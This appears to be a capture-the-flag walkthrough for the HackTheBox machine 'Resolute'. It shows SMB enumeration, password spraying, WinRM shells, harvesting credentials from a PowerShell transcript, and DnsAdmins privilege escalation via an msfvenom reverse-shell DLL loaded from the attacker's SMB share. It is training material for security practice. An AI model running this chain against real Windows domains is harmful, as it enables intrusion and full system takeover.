---
title: "HackTheBox: Resolute | Walkthrough"
date: 2020-05-30
categories: [hackthebox]
tags: [windows, smb, dnsadmin, hackthebox]
---

## Recon

Let’s start with an nmap scan:

```sh
nmap -A 10.10.10.169
````

Now enumerate SMB:

```sh
enum4linux 10.10.10.169 > enum
cat enum | grep "Account:"
```

You should see some accounts and some credentials.
Make a user list from it:

```sh
cat enum | grep "Account:" | cut -d " " -f8 > user_list
```

Now, try logging in with these accounts using Metasploit:

```sh
msfconsole
search smb_login
use auxiliary/scanner/smb/smb_login
show options
set RHOSTS 10.10.10.169
set SMBPass 'Welcome123!'
set USER_FILE ~/HTB/Resolute/user_list
run
```

You should see that it works for one user: **melanie**.

---

## User

Now, let’s use evil-winrm to get a shell.

```sh
cd ~/HTB/Resolute/
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm/
```

Running it:

```sh
ruby evil-winrm.rb
```

It throws an error — we need dependencies.
Check the `Gemfile`:

```sh
cat Gemfile
gem install winrm winrm-fs colorize stringio
```

Now, try again:

```sh
ruby evil-winrm.rb
```

This time, it shows the help menu.
Connect to the machine:

```sh
ruby evil-winrm.rb -u melanie -p 'Welcome123!' -i 10.10.10.169
```

You should get a shell as Melanie.

Grab the user flag:

```sh
cd ..
type Desktop\user.txt
```

---

## User 2 (Ryan)

Exploring the system:

```sh
cd C:\
dir -h
cd PSTranscripts
dir -h
cd 20191203
type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

Inside the PowerShell transcript, you should see credentials for **Ryan**.

Save them in a file for later:

```
Username: ryan
Password: Serv3rAdmin4cc123!
```

Now log in as Ryan:

```sh
ruby evil-winrm.rb -u ryan -p 'Serv3rAdmin4cc123!' -i 10.10.10.169
```

---

## Administrator

Check privileges:

```sh
whoami /all
```

We see that Ryan is a member of the **DNSAdmin** group.
This group can be abused for privilege escalation via DNS plugin DLL injection.

(For a more detailed write-up of this privesc, see my post: [Windows Privilege Escalation: DNSAdmin to DomainController](/windows-privilege-escalation-dnsadmin-to-domaincontroller/))

---

## Root

First, generate a malicious DLL payload:

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.155 LPORT=4444 --platform=windows -f dll > ~/HTB/Resolute/share/plugin.dll
```

Start an SMB share to host the DLL:

```sh
cd /usr/share/doc/python3-impacket/examples
./smbserver.py SHARE ~/HTB/Resolute/share/
```

In another tab, set up a listener:

```sh
nc -nvlp 4444
```

Now, on the target Windows machine, configure DNS to load our malicious DLL:

```sh
dnscmd.exe Resolute.megabank.local /config /serverlevelplugindll \\10.10.15.155\share\plugin.dll
sc.exe stop dns
sc.exe start dns
```

At this point, you should get a reverse shell as **SYSTEM** in your listener.

Finally, grab the root flag:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

Congratulations, root!

